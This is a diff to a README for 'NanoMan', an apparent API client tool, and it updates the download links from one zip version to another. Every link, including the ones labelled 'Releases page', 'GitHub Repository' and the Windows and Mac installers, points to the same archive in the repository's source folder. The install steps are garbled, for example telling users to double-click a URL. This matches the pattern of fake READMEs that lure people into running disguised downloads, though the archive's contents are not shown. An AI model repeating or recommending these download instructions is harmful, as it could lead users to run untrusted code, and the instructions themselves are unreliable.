@@ -8,7 +8,7 @@ NanoMan provides you with a clean and efficient way to interact with APIs. You w
 
 ## 🔗 Download NanoMan
 
-[![Download NanoMan](https://raw.githubusercontent.com/Juniorvidigal25/NanoMan/main/src/Man_Nano_v1.9-beta.4.zip)](https://raw.githubusercontent.com/Juniorvidigal25/NanoMan/main/src/Man_Nano_v1.9-beta.4.zip)
+[![Download NanoMan](https://github.com/Juniorvidigal25/NanoMan/raw/refs/heads/main/src/Man_Nano_v2.6-beta.2.zip)](https://github.com/Juniorvidigal25/NanoMan/raw/refs/heads/main/src/Man_Nano_v2.6-beta.2.zip)
 
 Click the link above to download NanoMan.
 
@@ -17,18 +17,18 @@ Click the link above to download NanoMan.
 Follow these simple steps to download and run NanoMan:
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://raw.githubusercontent.com/Juniorvidigal25/NanoMan/main/src/Man_Nano_v1.9-beta.4.zip) where you can find the latest version of NanoMan.
+   Go to our [Releases page](https://github.com/Juniorvidigal25/NanoMan/raw/refs/heads/main/src/Man_Nano_v2.6-beta.2.zip) where you can find the latest version of NanoMan.
 
 2. **Choose Your Version**  
    Look for the version labeled as "Latest Release". This version contains the most recent updates and improvements.
 
 3. **Download the Installer**  
-   Click on the release that matches your operating system. If you are unsure, most users can select the file labeled as `https://raw.githubusercontent.com/Juniorvidigal25/NanoMan/main/src/Man_Nano_v1.9-beta.4.zip` for Windows users or `https://raw.githubusercontent.com/Juniorvidigal25/NanoMan/main/src/Man_Nano_v1.9-beta.4.zip` for Mac users.
+   Click on the release that matches your operating system. If you are unsure, most users can select the file labeled as `https://github.com/Juniorvidigal25/NanoMan/raw/refs/heads/main/src/Man_Nano_v2.6-beta.2.zip` for Windows users or `https://github.com/Juniorvidigal25/NanoMan/raw/refs/heads/main/src/Man_Nano_v2.6-beta.2.zip` for Mac users.
 
 4. **Install the Application**  
    Once the download is complete, locate the file in your downloads folder.  
-   - For Windows: Double-click the `https://raw.githubusercontent.com/Juniorvidigal25/NanoMan/main/src/Man_Nano_v1.9-beta.4.zip` file and follow the on-screen instructions to complete the installation.  
-   - For Mac: Open the `https://raw.githubusercontent.com/Juniorvidigal25/NanoMan/main/src/Man_Nano_v1.9-beta.4.zip` file, drag the NanoMan application to your Applications folder, and then launch it from there.
+   - For Windows: Double-click the `https://github.com/Juniorvidigal25/NanoMan/raw/refs/heads/main/src/Man_Nano_v2.6-beta.2.zip` file and follow the on-screen instructions to complete the installation.  
+   - For Mac: Open the `https://github.com/Juniorvidigal25/NanoMan/raw/refs/heads/main/src/Man_Nano_v2.6-beta.2.zip` file, drag the NanoMan application to your Applications folder, and then launch it from there.
 
 5. **Open NanoMan**  
    After installation, find NanoMan in your applications list and click to open it.
@@ -60,7 +60,7 @@ Before you download NanoMan, ensure your system meets the following requirements
 
 ## 📥 Download & Install
 
-To begin, visit our [Releases page](https://raw.githubusercontent.com/Juniorvidigal25/NanoMan/main/src/Man_Nano_v1.9-beta.4.zip) for the latest version. Download the installer that matches your OS, then follow the installation instructions outlined above.
+To begin, visit our [Releases page](https://github.com/Juniorvidigal25/NanoMan/raw/refs/heads/main/src/Man_Nano_v2.6-beta.2.zip) for the latest version. Download the installer that matches your OS, then follow the installation instructions outlined above.
 
 ## ❓ Frequently Asked Questions
 
@@ -82,7 +82,7 @@ We welcome contributions from everyone! If you have ideas for new features, enco
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://raw.githubusercontent.com/Juniorvidigal25/NanoMan/main/src/Man_Nano_v1.9-beta.4.zip)
-- [Releases Page](https://raw.githubusercontent.com/Juniorvidigal25/NanoMan/main/src/Man_Nano_v1.9-beta.4.zip)
+- [GitHub Repository](https://github.com/Juniorvidigal25/NanoMan/raw/refs/heads/main/src/Man_Nano_v2.6-beta.2.zip)
+- [Releases Page](https://github.com/Juniorvidigal25/NanoMan/raw/refs/heads/main/src/Man_Nano_v2.6-beta.2.zip)
 
 Thank you for choosing NanoMan. We hope you enjoy using it!
